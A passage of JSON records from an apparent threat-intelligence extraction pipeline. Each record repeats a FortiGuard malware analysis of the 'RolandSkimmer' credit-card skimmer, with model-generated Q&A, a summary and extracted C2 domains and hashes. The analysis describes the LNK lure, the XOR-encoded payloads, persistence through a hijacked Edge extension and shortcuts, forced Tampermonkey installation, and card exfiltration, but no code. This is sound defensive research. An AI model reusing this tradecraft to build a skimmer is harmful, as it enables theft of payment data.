reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically a sophisticated campaign dubbed \"RolandSkimmer\" that targets users in Bulgaria and leverages malicious browser extensions.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer malware steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information. While it is not specifically referred to as a \"wallet stealer\", it does target and steal financial information.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria, but specific bank names, regions, or wallets are not mentioned in the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is \"RolandSkimmer\", a sophisticated credit card skimming campaign that targets users in Bulgaria, primarily through malicious browser extensions on Chrome, Edge, and Firefox. The attackers use a deceptive LNK file to initiate the infection, which deploys obfuscated scripts to establish persistent and covert access, allowing them to harvest and exfiltrate sensitive financial data. The targets are Microsoft Windows users, and the potential impact is high, as the malware can collect and steal credit card information, leading to financial loss and identity theft. The attackers' use of advanced techniques, such as obfuscated VBScripts and XOR-encoded files, makes detection and mitigation challenging, emphasizing the need for robust security measures to prevent such infections.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["intelligence", "apt", "bank", "botnet", "malicious", "banking trojan", "threat", "phishing", "browser", "analysis"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically a sophisticated campaign dubbed \"RolandSkimmer\" that targets users through malicious browser extensions.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer malware steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information. While it is not specifically referred to as a wallet stealer, it has similar goals of stealing financial information.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria, but specific bank names, regions, or wallets are not mentioned in the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is \"RolandSkimmer\", a sophisticated credit card skimming campaign that targets users in Bulgaria via malicious browser extensions on Chrome, Edge, and Firefox. The attackers use a combination of techniques, including obfuscated scripts, XOR-encoded files, and deceptive naming strategies to evade detection and maintain persistence. The targets of this campaign are Microsoft Windows users, and the potential impact is the theft of sensitive financial data, including credit card information, which can lead to significant financial losses and identity theft. The attackers' use of legitimate system tools and scripting capabilities allows them to achieve stealth, persistence, and data exfiltration, making this threat highly severe.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["intelligence", "browser", "apt", "malicious", "threat", "botnet", "bank", "banking trojan", "phishing", "analysis"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from 